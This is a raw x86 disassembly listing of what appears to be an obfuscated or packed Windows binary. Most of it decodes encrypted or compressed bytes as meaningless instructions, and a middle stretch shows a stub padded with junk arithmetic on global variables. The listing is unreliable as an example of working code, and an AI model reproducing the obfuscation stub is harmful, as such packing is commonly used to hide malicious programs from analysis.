  40305a:	or     ah,BYTE PTR [ebx-0x5d]
  40305d:	mov    eax,ds:0x32faa675
  403062:	inc    ebp
  403063:	add    DWORD PTR [eax+0xa3aef5],eax
  403069:	mov    esp,DWORD PTR [ecx+0x28783aed]
  40306f:	adc    ebx,DWORD PTR [esi-0x55]
  403072:	mov    edx,0xf3eeb64e
  403077:	hlt    
  403078:	fadd   DWORD PTR [eax+0x2e]
  40307b:	pushf  
  40307c:	fwait
  40307d:	mov    bh,BYTE PTR [edi-0x65093016]
  403083:	mov    ch,0xba
  403085:	test   DWORD PTR [eax+0x7ab0d47],edi
  40308b:	scas   eax,DWORD PTR es:[edi]
  40308c:	adc    DWORD PTR [edx+ecx*8],ecx
  40308f:	push   ds
  403090:	das    
  403091:	xor    al,0x41
  403093:	stc    
  403094:	dec    ebx
  403095:	call   0xc05c8fc3
  40309a:	cmp    bh,BYTE PTR [ebp-0x15]
  40309d:	call   0x9d17:0x6371d0fa
  4030a4:	pop    edx
  4030a5:	push   ecx
  4030a6:	xchg   ebp,eax
  4030a7:	imul   ebp,esi,0x3f86dc09
  4030ad:	mov    al,ds:0x2834ee8a
  4030b2:	pop    ecx
  4030b3:	xor    ah,BYTE PTR [ecx+0x7b]
  4030b6:	(bad)  
  4030b7:	stc    
  4030b8:	mul    ecx
  4030ba:	pop    ecx
  4030bb:	cdq    
  4030bc:	fdiv   QWORD PTR [ecx-0x43fb8676]
  4030c2:	pushf  
  4030c3:	bound  eax,QWORD PTR [ebx]
  4030c5:	mov    ah,0xae
  4030c7:	aaa    
  4030c8:	loopne 0x40312e
  4030ca:	inc    eax
  4030cb:	(bad)  
  4030cc:	add    BYTE PTR [esi-0x25],bh
  4030cf:	jp     0x403102
  4030d1:	push   edi
  4030d2:	fild   DWORD PTR [ecx+eax*8-0x7b9fb75b]
  4030d9:	dec    ebx
  4030da:	mov    al,ds:0xaee3e4f0
  4030df:	jns    0x40307c
  4030e1:	lock stos DWORD PTR es:[edi],eax
  4030e3:	lods   al,BYTE PTR ds:[esi]
  4030e4:	ror    BYTE PTR [ebx+0x21e0ce54],cl
  4030ea:	add    DWORD PTR [ecx-0x78],0x322b183d
  4030f1:	push   ebx
  4030f2:	or     edx,DWORD PTR [ecx-0x391346f6]
  4030f8:	cmp    al,0xa8
  4030fa:	inc    eax
  4030fb:	das    
  4030fc:	mov    ch,0x80
  4030fe:	lock jnp 0x403096
  403101:	sbb    BYTE PTR [ebp+0xcccef5b],bh
  403107:	stc    
  403108:	dec    ch
  40310a:	js     0x403095
  40310c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40310d:	les    edx,FWORD PTR [edx-0x30]
  403110:	fisttp WORD PTR [edx-0xc429b75]
  403116:	pusha  
  403117:	sub    al,0x33
  403119:	and    al,0xc1
  40311b:	shl    ebx,cl
  40311d:	bound  edx,QWORD PTR [edi-0x6c]
  403120:	fldenv [ecx+0x3f]
  403123:	(bad)  
  403124:	inc    ebp
  403125:	sub    eax,0x65988814
  40312a:	or     ch,ah
  40312c:	fld    DWORD PTR [esi-0x73]
  40312f:	pop    ss
  403130:	retf   
  403131:	int    0xa3
  403133:	and    DWORD PTR [edi],0xac31d3da
  403139:	cmovnp esi,DWORD PTR [esp+edi*2]
  40313d:	push   0xffffffac
  40313f:	pop    ebp
  403140:	jmp    0x403132
  403142:	jp     0x4031a4
  403144:	xor    edi,ecx
  403146:	aaa    
  403147:	mov    ebx,0x66f08950
  40314c:	add    eax,0x9ff6d0ab
  403151:	das    
  403152:	iret   
  403153:	aaa    
  403154:	sub    BYTE PTR [ebp-0x4216abc6],dl
  40315a:	jmp    0x68f1:0x9384774
  403161:	inc    ebp
  403162:	sub    ch,BYTE PTR [esi-0x3d]
  403165:	mov    ebx,0x7cb6f010
  40316a:	test   al,0xba
  40316c:	sahf   
  40316d:	mov    al,ds:0x27860d2a
  403172:	inc    eax
  403173:	pop    es
  403174:	mov    al,ds:0x379e55f7
  403179:	jecxz  0x4031ae
  40317b:	pop    ds
  40317c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40317d:	push   edx
  40317e:	lods   eax,DWORD PTR ds:[esi]
  40317f:	xchg   ebp,eax
  403180:	inc    edx
  403181:	shl    DWORD PTR [ebx],cl
  403183:	out    dx,al
  403184:	aam    0xb
  403186:	js     0x4031a0
  403188:	sbb    eax,0xf55c7f8f
  40318d:	fiadd  WORD PTR [edx]
  40318f:	xchg   esi,eax
  403190:	add    al,0x2c
  403192:	mov    cl,BYTE PTR [ecx-0x6e]
  403195:	into   
  403196:	repnz inc ecx
  403198:	loop   0x4031f1
  40319a:	imul   esp,ebp,0x7cf1eec4
  4031a0:	xchg   esp,eax
  4031a1:	pop    ds
  4031a2:	in     eax,dx
  4031a3:	and    DWORD PTR [ebx-0x570f2fc3],ecx
  4031a9:	stos   DWORD PTR es:[edi],eax
  4031aa:	mov    esp,0xd0111c52
  4031af:	stos   BYTE PTR es:[edi],al
  4031b0:	fst    QWORD PTR [di]
  4031b3:	into   
  4031b4:	push   0x16
  4031b6:	sbb    DWORD PTR [eax-0x3554562d],0xe3eae30a
  4031c0:	fiadd  DWORD PTR [ebx]
  4031c2:	jno    0x4031d4
  4031c4:	iret   
  4031c5:	jge    0x4031d4
  4031c7:	stc    
  4031c8:	xchg   edx,eax
  4031c9:	(bad)  [edi-0x77]
  4031cc:	mov    eax,ds:0x3d2694ef
  4031d1:	push   edi
  4031d3:	cmp    eax,0xd2ec1578
  4031d8:	std    
  4031d9:	cwde   
  4031da:	jmp    0xdc0a1d23
  4031df:	pop    ds
  4031e0:	popf   
  4031e1:	push   ss
  4031e2:	daa    
  4031e3:	mov    DWORD PTR [ebx+ebp*2],ebp
  4031e6:	jnp    0x403246
  4031e8:	stos   BYTE PTR es:[edi],al
  4031e9:	dec    edx
  4031ea:	int3   
  4031eb:	xchg   edx,eax
  4031ec:	jmp    0xa0738106
  4031f1:	ret    
  4031f2:	in     eax,0x7d
  4031f4:	lods   eax,DWORD PTR ds:[esi]
  4031f5:	pop    ebp
  4031f6:	lea    esi,[eax-0x5d]
  4031f9:	lahf   
  4031fa:	je     0x4031d9
  4031fc:	xchg   ebp,eax
  4031fd:	les    esp,FWORD PTR [ecx]
  4031ff:	aaa    
  403200:	push   ebp
  403201:	loopne 0x403282
  403203:	lds    ecx,FWORD PTR [ecx+esi*2]
  403206:	test   BYTE PTR [eax],al
  403208:	xor    al,0x65
  40320a:	les    edx,FWORD PTR [eax]
  40320c:	call   0x754ef703
  403211:	adc    eax,0xa414d0aa
  403216:	(bad)  
  403217:	rep lods eax,DWORD PTR ds:[esi]
  403219:	scas   al,BYTE PTR es:[edi]
  40321a:	(bad)  
  40321b:	push   0xc0cd3bf6
  403220:	xor    eax,0xde5537b7
  403225:	rcr    BYTE PTR [eax],cl
  403227:	loope  0x4031b9
  403229:	push   edx
  40322a:	icebp  
  40322b:	enter  0xf6dc,0x24
  40322f:	xchg   esp,ecx
  403231:	sbb    BYTE PTR [esi+eax*4-0x30292c3],ch
  403238:	test   BYTE PTR [ebx],ch
  40323a:	and    dh,ch
  40323c:	fisttp QWORD PTR [esi+0x548ade8c]
  403242:	test   BYTE PTR [ebx-0x7cb339bc],dl
  403248:	std    
  403249:	xor    bx,WORD PTR [edx-0x29]
  40324d:	pop    edi
  40324e:	rol    DWORD PTR [eax-0x73f16956],cl
  403254:	mov    dl,0xfd
  403256:	ins    DWORD PTR es:[edi],dx
  403257:	push   esp
  403258:	xor    BYTE PTR [ebp+0x30e91db5],al
  40325e:	sbb    DWORD PTR [eax+ecx*8-0x53a3ed7b],esp
  403265:	aas    
  403266:	and    BYTE PTR [ebx-0x27],0xca
  40326a:	sub    eax,0x1cd24f2d
  40326f:	mov    ebx,?
  403271:	scas   al,BYTE PTR es:[edi]
  403272:	adc    BYTE PTR [edx],dl
  403274:	add    eax,0xdc722762
  403279:	jnp    0x4031fb
  40327b:	imul   ebp,DWORD PTR [ebx+0x23faf8e2],0x78
  403282:	push   ss
  403283:	in     al,dx
  403284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403285:	iret   
  403286:	add    eax,0xaff2bc11
  40328b:	sbb    dl,dl
  40328d:	jle    0x403241
  40328f:	(bad)  
  403290:	and    ah,bh
  403292:	cs dec ebx
  403294:	dec    eax
  403295:	arpl   WORD PTR [eax-0x6b],si
  403298:	and    BYTE PTR [ebx+eiz*8],dl
  40329b:	xchg   BYTE PTR ds:[esi],cl
  40329e:	xor    bl,dl
  4032a0:	rcr    ebp,0xa0
  4032a3:	mov    ch,0x58
  4032a5:	push   0x46e95d55
  4032aa:	leave  
  4032ab:	xor    bh,BYTE PTR [edi]
  4032ad:	sbb    ebp,esp
  4032af:	fsubr  QWORD PTR [edi+0xf44ebbd]
  4032b5:	or     BYTE PTR [ebp+0x4eb77843],bh
  4032bb:	jl     0x40327b
  4032bd:	mov    esi,0x6e4384ad
  4032c2:	dec    esp
  4032c3:	adc    edi,DWORD PTR [ebp-0x636ec8b6]
  4032c9:	pusha  
  4032ca:	push   ebx
  4032cb:	xchg   esp,eax
  4032cc:	shr    DWORD PTR [eax],0xbf
  4032cf:	rol    DWORD PTR [ebp+0x71d0b3e5],0x7d
  4032d6:	xlat   BYTE PTR ds:[ebx]
  4032d7:	iret   
  4032d8:	push   ecx
  4032d9:	int3   
  4032da:	and    al,0x4c
  4032dc:	inc    ebp
  4032dd:	fidiv  DWORD PTR [ecx+0x43]
  4032e0:	out    0x5f,al
  4032e2:	aas    
  4032e3:	dec    ebx
  4032e4:	icebp  
  4032e5:	retf   
  4032e6:	mov    edx,0x773cc34b
  4032eb:	xor    bh,BYTE PTR [ebx]
  4032ed:	gs jle 0x4032e9
  4032f0:	repnz outs dx,BYTE PTR ds:[esi]
  4032f2:	xor    bl,al
  4032f4:	sbb    BYTE PTR [ebx],cl
  4032f6:	sub    esp,DWORD PTR [edi+ebx*4]
  4032f9:	jns    0x403347
  4032fb:	fdiv   DWORD PTR [ecx]
  4032fd:	add    eax,0xf0e24777
  403302:	xchg   BYTE PTR [edx+ebp*1-0x24],cl
  403306:	fisubr WORD PTR [eax-0x1a]
  403309:	cmp    ebx,eax
  40330b:	sbb    eax,DWORD PTR ds:0x98f90269
  403311:	add    BYTE PTR [edi+esi*2+0x6d59ed21],dl
  403318:	add    ch,bh
  40331a:	push   ebx
  40331b:	adc    edx,DWORD PTR [ebx+0x102fa021]
  403321:	or     al,0x98
  403323:	push   esi
  403324:	in     eax,0x28
  403326:	or     eax,0x50a807e6
  40332b:	and    al,0xb4
  40332d:	scas   eax,DWORD PTR es:[edi]
  40332e:	sub    eax,0x9f472cec
  403333:	outs   dx,BYTE PTR ds:[esi]
  403334:	call   0x4771:0x2141c503
  40333b:	xchg   edx,eax
  40333c:	je     0x4032ca
  40333e:	scas   eax,DWORD PTR es:[edi]
  40333f:	mov    al,ds:0x19057ac1
  403344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403345:	mov    ebp,0xb242b7f2
  40334a:	int3   
  40334b:	inc    esp
  40334c:	xchg   al,al
  40334e:	jne    0x4032ef
  403350:	ret    0x12df
  403353:	popa   
  403354:	cmp    BYTE PTR [eax+0xb],cl
  403357:	ret    0x3c16
  40335a:	mov    dl,0xa3
  40335c:	push   ebx
  40335e:	shl    ah,0x61
  403361:	sahf   
  403362:	push   ebp
  403363:	push   ecx
  403364:	pop    esp
  403365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403366:	repz inc esi
  403368:	int3   
  403369:	sub    ecx,0x27
  40336c:	mov    edx,0xf98cbdf3
  403371:	or     BYTE PTR ds:0x9dd113cc,bh
  403377:	xor    eax,0xbf60009d
  40337c:	out    0xd4,al
  40337e:	xchg   ebx,eax
  40337f:	fld    TBYTE PTR [ecx-0x7b]
  403382:	sbb    edi,DWORD PTR [ebx+0x51]
  403385:	inc    eax
  403386:	imul   ebp,DWORD PTR [ebp-0x674fc0c5],0xffffffa6
  40338d:	loopne 0x4033f8
  40338f:	js     0x40334c
  403391:	jge    0x403412
  403393:	sbb    edx,DWORD PTR [ecx-0xa9251b4]
  403399:	dec    ebx
  40339a:	dec    esi
  40339b:	xchg   DWORD PTR [bx+di+0x1224],edi
  4033a0:	mov    cs:0x4a456302,al
  4033a6:	add    dl,bh
  4033a8:	and    BYTE PTR [ecx],dl
  4033aa:	pushf  
  4033ab:	adc    eax,0x3e02e3c1
  4033b0:	xor    eax,0xdf24e57b
  4033b5:	mov    DWORD PTR [ebx],eax
  4033b7:	jle    0x4033c0
  4033b9:	mov    edi,0xd9240ed9
  4033be:	cmp    eax,0xf52ee797
  4033c3:	jbe    0x4033ac
  4033c5:	sub    eax,0x6e57b93c
  4033ca:	add    dl,ah
  4033cc:	dec    eax
  4033cd:	scas   al,BYTE PTR es:[edi]
  4033ce:	aas    
  4033cf:	pop    esp
  4033d0:	enter  0xd88,0xb3
  4033d4:	or     bl,BYTE PTR [edx]
  4033d6:	mov    cl,0xc4
  4033d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033d9:	pop    ss
  4033da:	stc    
  4033db:	and    al,0x5a
  4033dd:	fbld   TBYTE PTR [eax+0x1f]
  4033e0:	xor    al,0xf4
  4033e2:	fidiv  WORD PTR [ecx-0x1db0a4cb]
  4033e8:	mov    dl,0xe5
  4033ea:	jbe    0x4033ae
  4033ec:	retf   0x90b
  4033ef:	aam    0x9d
  4033f1:	std    
  4033f2:	shr    DWORD PTR [edx-0x6a44dc9f],cl
  4033f8:	loop   0x403425
  4033fa:	shr    DWORD PTR es:[edx-0x64],0x51
  4033ff:	jae    0x4033aa
  403401:	pushf  
  403402:	or     DWORD PTR [edx+0x60],esp
  403405:	out    0xee,al
  403407:	adc    al,0xcd
  403409:	ins    DWORD PTR es:[edi],dx
  40340a:	out    dx,al
  40340b:	and    cl,BYTE PTR [eax]
  40340d:	out    dx,eax
  40340e:	mov    cl,0x61
  403410:	ret    0x58e2
  403413:	sbb    BYTE PTR [ebp+0xa],dl
  403416:	xchg   BYTE PTR [ebp-0x55bb5f6b],bl
  40341c:	or     edi,DWORD PTR [ecx]
  40341e:	lods   al,BYTE PTR ds:[esi]
  40341f:	push   ebx
  403420:	mov    ah,0x55
  403422:	pop    esi
  403423:	adc    edi,DWORD PTR [ebx]
  403425:	adc    ebx,edi
  403427:	sbb    ebx,DWORD PTR [esi+0x37]
  40342a:	push   eax
  40342b:	test   BYTE PTR [edx+0x27],ah
  40342e:	outs   dx,BYTE PTR ds:[esi]
  403430:	lods   al,BYTE PTR ds:[esi]
  403431:	cmp    BYTE PTR [eax+esi*8-0x76],ch
  403435:	push   ebp
  403436:	sbb    BYTE PTR [edx-0x31],dh
  403439:	out    0x56,eax
  40343b:	retf   0xb517
  40343e:	push   ebx
  40343f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403440:	mov    bh,0x36
  403442:	dec    edi
  403443:	cld    
  403444:	inc    edi
  403445:	(bad)
  403448:	and    al,0xfa
  40344a:	iret   
  40344b:	jmp    0x2495:0xe9333ff7
  403452:	inc    eax
  403453:	fcom   DWORD PTR [ebx]
  403455:	out    0xb5,al
  403457:	test   BYTE PTR [edx-0x15],dl
  40345a:	xor    eax,0xf55d8b57
  40345f:	scas   eax,DWORD PTR es:[edi]
  403460:	push   esi
  403461:	adc    DWORD PTR [esi-0x1f],ecx
  403464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403465:	hlt    
  403466:	ret    
  403467:	in     al,dx
  403468:	test   al,0x64
  40346a:	mov    ah,0x86
  40346c:	mov    al,0xcb
  40346e:	shl    DWORD PTR [ecx+0x1e2915d6],cl
  403474:	call   0xfee05492
  403479:	and    DWORD PTR [eax+ecx*4-0x427ac7d],ebx
  403480:	sub    DWORD PTR [esi+0x6030ef91],ebp
  403486:	call   0x637:0xf2bc596
  40348d:	mov    bl,0xe2
  40348f:	scas   al,BYTE PTR es:[edi]
  403490:	dec    eax
  403491:	push   ebx
  403492:	pop    edx
  403493:	scas   al,BYTE PTR es:[edi]
  403494:	xchg   edi,eax
  403495:	cmp    eax,DWORD PTR [ebx-0x593e39e0]
  40349b:	(bad)  
  40349c:	scas   eax,DWORD PTR es:[edi]
  40349d:	sbb    al,0x4a
  40349f:	and    esp,DWORD PTR [edx+edx*1]
  4034a2:	mov    al,0x56
  4034a4:	mov    gs,WORD PTR [ebx]
  4034a6:	scas   eax,DWORD PTR es:[edi]
  4034a7:	scas   al,BYTE PTR es:[edi]
  4034a8:	push   0x47d0cf64
  4034ad:	dec    ebp
  4034ae:	test   al,cl
  4034b0:	pop    esp
  4034b1:	or     BYTE PTR [eax-0x20],cl
  4034b4:	push   eax
  4034b5:	dec    eax
  4034b6:	cdq    
  4034b7:	jbe    0x403513
  4034b9:	cmc    
  4034ba:	pop    ss
  4034bb:	add    al,0xac
  4034bd:	dec    ebp
  4034be:	pop    ss
  4034bf:	inc    eax
  4034c0:	and    DWORD PTR [ebx],0x4b9fe8fa
  4034c6:	jmp    0x4034b6
  4034c8:	jp     0x4034af
  4034ca:	pop    ebx
  4034cb:	inc    ebx
  4034cc:	sbb    DWORD PTR [esi+0x590061ba],edx
  4034d2:	pop    eax
  4034d3:	mov    esp,DWORD PTR [edi+0x3c4995c]
  4034d9:	mov    ds:0xcdfcfe38,al
  4034de:	lods   al,BYTE PTR ds:[esi]
  4034df:	pop    ds
  4034e0:	mov    bh,0x72
  4034e2:	or     edx,DWORD PTR [edi]
  4034e4:	retf   0x4497
  4034e7:	adc    eax,0x69f689c3
  4034ec:	sbb    esi,DWORD PTR [ecx]
  4034ee:	xor    bl,BYTE PTR [ebp-0x15]
  4034f1:	fs push eax
  4034f3:	enter  0xebf8,0x73
  4034f7:	imul   ebx,DWORD PTR [ecx],0xbf23e7b8
  4034fd:	inc    ebp
  4034fe:	jle    0x403541
  403500:	outs   dx,DWORD PTR ds:[esi]
  403501:	ret    0xad28
  403504:	cli    
  403505:	mov    eax,ds:0x9987685e
  40350a:	xor    al,0xad
  40350c:	repz out dx,eax
  40350e:	mov    esp,0xc307c6e6
  403513:	repz aaa 
  403515:	fild   WORD PTR [edx]
  403517:	jbe    0x403597
  403519:	and    al,0x5
  40351b:	jge    0x403543
  40351d:	loop   0x4034f3
  40351f:	(bad)  
  403520:	ja     0x403549
  403522:	cmp    esi,edi
  403524:	inc    ecx
  403525:	sbb    al,ah
  403527:	sbb    al,0xbc
  403529:	xor    eax,0x7fdbdcef
  40352e:	ja     0x4035aa
  403530:	fst    DWORD PTR [esi+0x3a88f456]
  403536:	lds    ebx,FWORD PTR [eax+0xa]
  403539:	and    DWORD PTR [edi+0x675ba56d],esp
  40353f:	fimul  DWORD PTR [ebx]
  403541:	mov    dl,0x36
  403543:	icebp  
  403544:	pop    edx
  403545:	test   al,dl
  403547:	lods   eax,DWORD PTR ds:[esi]
  403548:	sub    ch,BYTE PTR [esi]
  40354a:	jp     0x4035bf
  40354c:	(bad)  [ebp-0x78]
  40354f:	into   
  403550:	push   esi
  403551:	adc    DWORD PTR [ebx+ebp*4-0x12c5131b],ebx
  403558:	rcl    bl,1
  40355a:	call   0x47e9:0xc66e80a1
  403561:	and    BYTE PTR [ebp-0x17],0x9f
  403565:	std    
  403566:	jno    0x403534
  403568:	push   esp
  403569:	adc    BYTE PTR [esi],dh
  40356b:	stos   BYTE PTR es:[edi],al
  40356c:	repz mov ds:0x2b310eb4,eax
  403572:	retf   0x6274
  403575:	push   ebx
  403576:	or     eax,0x8f8de4e6
  40357b:	out    dx,eax
  40357c:	pop    ebx
  40357d:	xchg   DWORD PTR [eax-0x59],esp
  403580:	jmp    0x403590
  403582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403583:	jecxz  0x40351d
  403585:	into   
  403586:	inc    ebx
  403587:	jg     0x403524
  403589:	mov    eax,0x14ae99ce
  40358e:	mov    ebx,0x38972242
  403593:	add    eax,0x1abd1658
  403598:	cmp    BYTE PTR [esi-0x2d33fec4],cl
  40359e:	cmp    dl,dl
  4035a0:	leave  
  4035a1:	cld    
  4035a2:	dec    eax
  4035a3:	sub    esp,DWORD PTR [ebp+0x3b]
  4035a6:	and    esp,edx
  4035a8:	jno    0x4035e6
  4035aa:	and    eax,0xc2994e8a
  4035af:	mov    ebx,0x1d0d22ff
  4035b4:	jmp    0x403551
  4035b6:	test   eax,0x89d824cb
  4035bb:	out    0xcf,al
  4035bd:	mov    ss,esp
  4035bf:	jmp    0x9c2f:0xf32a4ddd
  4035c6:	mov    cl,0xa2
  4035c8:	push   edi
  4035c9:	sub    eax,0xb6e5e982
  4035ce:	mov    bl,0x83
  4035d0:	xchg   BYTE PTR [edi-0x6625bbb6],al
  4035d6:	mov    edi,0x7cc4ca25
  4035db:	dec    eax
  4035dc:	jmp    0x9771:0x9d957b9b
  4035e3:	mov    al,0xca
  4035e5:	add    al,0x9e
  4035e7:	es aaa 
  4035e9:	mov    esi,0xa3b765a1
  4035ee:	cmp    bl,BYTE PTR [esi]
  4035f0:	ss (bad) 
  4035f3:	mov    BYTE PTR [ebx+0x6085c785],al
  4035f9:	(bad)  
  4035fa:	(bad)  
  4035fb:	(bad)  
  4035fc:	mov    ecx,0xa1f89c85
  403601:	jle    0x4035a5
  403603:	inc    edx
  403604:	add    BYTE PTR [ecx],cl
  403606:	add    eax,0x42a27a
  40360b:	mov    eax,DWORD PTR [ebp-0x14]
  40360e:	mov    DWORD PTR [ebp-0x9c],eax
  403614:	adc    DWORD PTR ds:0x42a29a,ecx
  40361a:	mov    eax,DWORD PTR [ebp-0x18]
  40361d:	mov    DWORD PTR [ebp-0x98],eax
  403623:	sbb    DWORD PTR ds:0x42a28a,0x5122
  40362d:	mov    eax,DWORD PTR [ebp-0x2c]
  403630:	xor    eax,esi
  403632:	add    eax,edi
  403634:	or     DWORD PTR ds:0x42a27a,0x42a2ea
  40363e:	mov    DWORD PTR [ebp-0x94],eax
  403644:	lea    eax,[ebp-0x48]
  403647:	mov    DWORD PTR [ebp-0x90],eax
  40364d:	mov    eax,DWORD PTR [ebp-0xa0]
  403653:	xor    eax,esi
  403655:	sbb    DWORD PTR ds:0x42a2f2,0x42a2da
  40365f:	add    eax,edi
  403661:	or     DWORD PTR ds:0x42a2ee,0x42a256
  40366b:	mov    DWORD PTR [ebp-0xa0],eax
  403671:	sub    DWORD PTR ds:0x42a272,0x1d49
  40367b:	lea    eax,[ebp-0xa0]
  403681:	push   eax
  403682:	neg    eax
  403684:	mov    eax,DWORD PTR [ebp+0xc]
  403687:	sub    DWORD PTR ds:0x42a2aa,0x2c11
  403691:	xor    eax,esi
  403693:	add    eax,edi
  403695:	push   eax
  403696:	mov    eax,ds:0x42943e
  40369b:	push   0x429394
  4036a0:	mov    DWORD PTR ds:0x42a286,0x524d
  4036aa:	push   DWORD PTR [eax]
  4036ac:	call   0x4084f6
  4036b1:	xor    edx,edx
  4036b3:	add    edx,DWORD PTR ds:0x42a29e
  4036b9:	and    DWORD PTR ds:0x42a28e,edx
  4036bf:	mov    ebx,DWORD PTR [ebp-0x14]
  4036c2:	mov    eax,DWORD PTR [ebp-0x18]
  4036c5:	mov    DWORD PTR [ebp-0x58],eax
  4036c8:	mov    eax,ds:0x42a306
  4036cd:	mov    edx,DWORD PTR ds:0x42a34e
  4036d3:	sub    edx,eax
  4036d5:	sub    eax,DWORD PTR [eax+edx*1]
  4036d8:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  4036df:	mov    eax,0xf89c85bb
  4036e4:	mov    DWORD PTR [ebp-0x1c],eax
  4036e7:	xor    DWORD PTR ds:0x42a286,0x37ec
  4036f1:	lea    ecx,[eax-0x16]
  4036f4:	and    DWORD PTR ds:0x42a2e2,0x0
  4036fe:	jmp    0x403710
  403703:	mov    edx,DWORD PTR ds:0x42a2e2
  403709:	inc    edx
  40370a:	mov    DWORD PTR ds:0x42a2e2,edx
  403710:	cmp    DWORD PTR ds:0x42a2e2,0x18
  403717:	jae    0x40376b
  40371d:	cmp    DWORD PTR ds:0x42a2e2,0x4
  403724:	jl     0x40376b
  40372a:	jmp    0x40374c
  40372f:	push   DWORD PTR [ebp-0x20]
  403732:	push   DWORD PTR [ebp-0x18]
  403735:	push   DWORD PTR [ebp-0x20]
  403738:	push   DWORD PTR [ebp-0x18]
  40373b:	push   DWORD PTR [ebp-0x14]
  40373e:	push   DWORD PTR [ebp-0x20]
  403741:	push   0x429247
  403746:	call   DWORD PTR ds:0x42a3d6
  40374c:	cmp    DWORD PTR ds:0x42a2e2,0x3
  403753:	jne    0x403766
  403759:	mov    edx,DWORD PTR ds:0x42a2e2
  40375f:	inc    edx
  403760:	mov    DWORD PTR ds:0x42a2e2,edx
  403766:	jmp    0x403703
  40376b:	mov    DWORD PTR [ebp-0x28],ecx
  40376e:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  403775:	neg    DWORD PTR ds:0x42a25e
  40377b:	mov    DWORD PTR [ebp-0x8],eax
  40377e:	xor    edx,edx
  403780:	or     edx,DWORD PTR ds:0x42a2da
  403786:	xor    DWORD PTR ds:0x42a29a,edx
  40378c:	mov    eax,DWORD PTR [ebp-0x10]
  40378f:	neg    edx
  403791:	xor    eax,esi
  403793:	mov    edx,0xffcd8d8f
  403798:	sub    edx,eax
  40379a:	mov    eax,ds:0x42a2fe
  40379f:	mov    DWORD PTR [ebp-0xc],edx
  4037a2:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  4037a9:	mov    eax,DWORD PTR [ebp-0x8]
  4037ac:	mov    DWORD PTR ds:0x42a2ce,0x6d9f
  4037b6:	mov    DWORD PTR [ebp-0x3c],ebx
  4037b9:	mov    DWORD PTR ds:0x42a286,0xb52
  4037c3:	cmp    eax,ecx
  4037c5:	mov    DWORD PTR ds:0x42a2d2,0x1900
  4037cf:	je     0x408220
  4037d5:	xor    DWORD PTR ds:0x42a2b6,edx
  4037db:	mov    eax,DWORD PTR [ebp-0x10]
  4037de:	jmp    0x405b37
  4037e3:	or     al,BYTE PTR es:[edx-0x17]
  4037e7:	inc    edx
  4037e8:	mov    eax,ds:0x1d8d8286
  4037ed:	ins    DWORD PTR es:[edi],dx
  4037ee:	mov    al,ds:0x9860382c
  4037f3:	inc    edi
  4037f4:	pop    esi
  4037f5:	add    DWORD PTR [ebx-0x7c7ca1b9],0xffffffca
  4037fc:	xor    ecx,0xf23a9bbf
  403802:	jmp    0x6928:0x210889dd
  403809:	xlat   BYTE PTR ds:[ebx]
  40380a:	mov    ds:0x407fb0aa,al
  40380f:	inc    ecx
  403810:	loop   0x403871
  403812:	lahf   
  403813:	call   0xbeec:0xbcf67390
  40381a:	mov    eax,ecx
  40381c:	cmp    BYTE PTR [edi-0x37],0x98
  403820:	ss push es
  403822:	jne    0x4038a0
  403824:	and    eax,0x4abe902a
  403829:	repnz gs inc edx
  40382c:	dec    edi
  40382d:	dec    edx
  40382e:	fistp  DWORD PTR [ecx+0x2242d34d]
  403834:	lods   eax,DWORD PTR ds:[esi]
  403835:	ret    
  403836:	pop    edx
  403837:	push   esi
  403838:	dec    ecx
  403839:	xor    al,0x83
  40383b:	sbb    BYTE PTR [edx-0x53],ah
  40383e:	jo     0x403844
  403840:	xchg   DWORD PTR [edi+edi*2-0x2d],esi
  403844:	jg     0x4038aa
  403846:	and    ecx,0xf81038e2
  40384c:	ins    BYTE PTR es:[edi],dx
  40384d:	cmp    al,0xab
  40384f:	xchg   ebx,eax
  403850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403851:	sub    dl,BYTE PTR ds:0xa6e5557f
  403857:	ficomp WORD PTR [ebx]
  403859:	in     al,0xf7
  40385b:	push   ebp
  40385c:	ja     0x4037f5
  40385e:	aad    0x40
  403860:	call   0x5c868cd2
  403865:	push   edx
  403866:	add    BYTE PTR [ecx-0x3bb61250],cl
  40386c:	sub    BYTE PTR [edx],cl
  40386e:	sbb    eax,0x3cb1aad
  403873:	fist   DWORD PTR [eax]
  403875:	xchg   esi,eax
  403876:	scas   eax,DWORD PTR es:[edi]
  403877:	inc    ebx
  403878:	das    
  403879:	ret    
  40387a:	dec    edx
  40387b:	add    edi,ebp
  40387d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40387e:	pop    ebx
  40387f:	adc    BYTE PTR [ecx],dl
  403881:	dec    edi
  403882:	stc    
  403883:	push   cs
  403884:	pushf  
  403885:	xchg   ebx,eax
  403886:	cmp    eax,0xed2db9fd
  40388b:	cmp    eax,0x8c33ee06
  403890:	dec    esp
  403891:	jns    0x4038ff
  403893:	mov    DWORD PTR [ebx],eax
  403895:	not    DWORD PTR [esi+0x1b]
  403898:	repz add BYTE PTR [eax+0x7929ee3e],0x5d
  4038a0:	add    ecx,DWORD PTR [ebx+edi*4+0x5083c4d]
  4038a7:	adc    ecx,esi
  4038a9:	(bad)  
  4038aa:	outs   dx,BYTE PTR ds:[esi]
  4038ab:	xchg   BYTE PTR [edi-0x4dc0a275],bl
  4038b1:	sub    al,0x15
  4038b3:	push   esp
  4038b4:	mov    eax,ds:0x3d29b047
  4038b9:	out    dx,eax
  4038ba:	daa    
  4038bb:	pop    ss
  4038bc:	loopne 0x403929
  4038be:	xchg   ecx,eax
  4038bf:	mov    ah,BYTE PTR [eax+eax*2-0x9]
  4038c3:	jbe    0x4038a1
  4038c5:	adc    eax,0x2355686f
  4038ca:	stos   BYTE PTR es:[edi],al
  4038cb:	popf   
  4038cc:	lods   eax,DWORD PTR ds:[esi]
  4038cd:	jb     0x403888
  4038cf:	jmp    0x4038c8
  4038d1:	sbb    ah,dh
  4038d3:	dec    esp
  4038d4:	in     eax,dx
  4038d5:	daa    
  4038d6:	push   ds
